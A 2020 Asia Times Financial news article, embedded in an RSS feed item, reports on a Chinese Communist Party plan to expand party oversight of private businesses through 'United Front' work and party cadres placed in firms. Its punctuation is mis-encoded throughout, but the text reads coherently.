        <h3>(ATF)√Ç&nbsp;Chinese President Xi Jinping and the Communist Party's Central Committee have laid out a plan for a √¢‚Ç¨Àúnew era√¢‚Ç¨‚Ñ¢ in which the party has better control over private business in China. </h3><p><a href="http://www.xinhuanet.com/fortune/2020-09/15/c_1126497384.htm">The plan</a> was detailed in a 5,000-word statement √¢‚Ç¨‚Äú and all regions and departments in the country have been told to follow the new guidelines.</p><p><span>This was the top story on Wednesday's CCTV Evening News √¢‚Ç¨‚Äú how the president had issued √¢‚Ç¨≈ìimportant instructions√¢‚Ç¨ÔøΩ.</span></p><p><span>It had a long-winded title: "Opinion on Strengthening the United Front Work of the Private Economy in the New Era".</span></p><p><span>The ultimate goal is for the party to have ideological leadership of private enterprise.</span></p><p><span>The statement seeks to improve CCP control over private enterprise and entrepreneurs through United Front Work √¢‚Ç¨≈ìto better focus the wisdom and strengthen of the private businesspeople on the goal and mission to realise the great rejuvenation of the Chinese nation.√¢‚Ç¨ÔøΩ</span></p><p><span>Xi's instructions were issued ahead of a conference today on this very topic.√Ç&nbsp;</span>The party wants to see a "united front" between private enterprise and government business.</p><h3><figure><iframe frameborder="0" scrolling="no" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" mozallowfullscreen="" webkitallowfullscreen="" oallowfullscreen="" msallowfullscreen="" allowtransparency="true" src="//player.vimeo.com/video/459459469"></iframe></figure>100 ways to rein in the private sector</h3><p>Since the 18th National Congress in May, members of the party's Central Committee and Comrade Xi have proposed a series of new concepts and strategies, and adopted a series of major measures to guide and promote private economic 'united front' work. They say these moves have achieved "remarkable results". </p><p>As China√¢‚Ç¨‚Ñ¢s private economy has grown and diversified, the statement says "these measures will bring about a great rejuvenation of the Chinese nation under Xi Jinping thought".</p><p>Overall, there are more than 100 measures, including guidance on selection of personnel to implement the measures. </p><p>"We must also see that socialism with Chinese characteristics has entered a new era, [as] the scale of the private economy has continued to expand, risks and challenges have increased significantly, the values and interests of the private economy have become increasingly diverse, and the united front work of the private economy is facing new situations and tasks," the statement says.</p><p>"In order to thoroughly implement the major decisions and deployments of the Party Central Committee, to further strengthen the Party's leadership of the private economic united front work, and to better integrate the wisdom and strength of private economic personnel to the goal and task of achieving the great rejuvenation of the Chinese nation, the following opinions are hereby offered."</p><p>The primary stated significance of the measures is √¢‚Ç¨≈ìenhancement of the party√¢‚Ç¨‚Ñ¢s leadership over the private economy √¢‚Ç¨‚Äú private economic figures are to be more closely united around the party.√¢‚Ç¨ÔøΩ</p><h3>More CCP involvement in business</h3><p>This is quite a turnaround. Previously, private business was not considered very worthy for party membership or influence, but it has gradually entered the heart of the regime.</p><p>According to the new provisions, private firms will need a certain amount of CCP registered employees, which is already a long-term practise in large private firms but not smaller ones. </p><p>These cadres will make sure businesses follow the guiding ideology√Ç&nbsp;√¢‚Ç¨≈ìGuided by Xi Jinping√¢‚Ç¨‚Ñ¢s Thought on Socialism with Chinese Characteristics for a New Era.√¢‚Ç¨ÔøΩ </p><p>They will also guide private business people to enhance the latest CCP catchphrases √¢‚Ç¨‚Äú √¢‚Ç¨≈ìfour consciousnesses√¢‚Ç¨ÔøΩ, strengthen the √¢‚Ç¨≈ìfour self-confidences√¢‚Ç¨ÔøΩ, and achieve the √¢‚Ç¨≈ìtwo safeguards.√¢‚Ç¨ÔøΩ</p><p>Duties of cadres will include the duties of strengthening ideological guidance,√Ç&nbsp;guiding private economic figures to increase their awareness of self-discipline, build a strong line of ideological and moral defence, strictly regulate their own words and deeds, cultivate a healthy lifestyle, and create a good public image.√Ç&nbsp;</p><p>They will also need to continuously improve law abidance and moral standards of private citizens.√Ç&nbsp;</p><p>Communication channels will be set up between private business and the party to report back on progress and other matters.</p>
      
      
        <p>Tags:</p>
      
      </article></div>]]>
            </description>
            <link>https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511672</guid>
            <pubDate>Fri, 18 Sep 2020 00:33:21 GMT</pubDate>
        </item>
    </channel>
</rss>
